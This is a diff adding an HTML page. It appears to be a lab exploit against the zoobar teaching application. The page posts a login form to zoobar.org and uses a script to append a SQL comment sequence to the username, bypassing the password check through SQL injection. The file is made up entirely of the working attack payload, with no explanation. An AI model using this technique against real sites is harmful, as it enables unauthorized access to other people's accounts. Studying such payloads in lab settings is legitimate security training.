@@ -1,0 +1,17 @@
+<html>
+<head>
+</head>
+<body>
+	<form method="POST" id="loginform" name="loginform" action="http://zoobar.org/index.php">
+		<input id="login_username" name="login_username" type="text">
+		<input id="login_password" name="login_password" type="hidden" value="placeholder" >
+		<input id="submit_login" name="submit_registration" type="submit" value="Log in">
+	</form>
+	
+	<script>
+	document.getElementById("submit_login").onclick = function(){
+		document.getElementById("login_username").value = document.getElementById("login_username").value + "';--";
+		}
+	</script>
+</body>
+</html>	
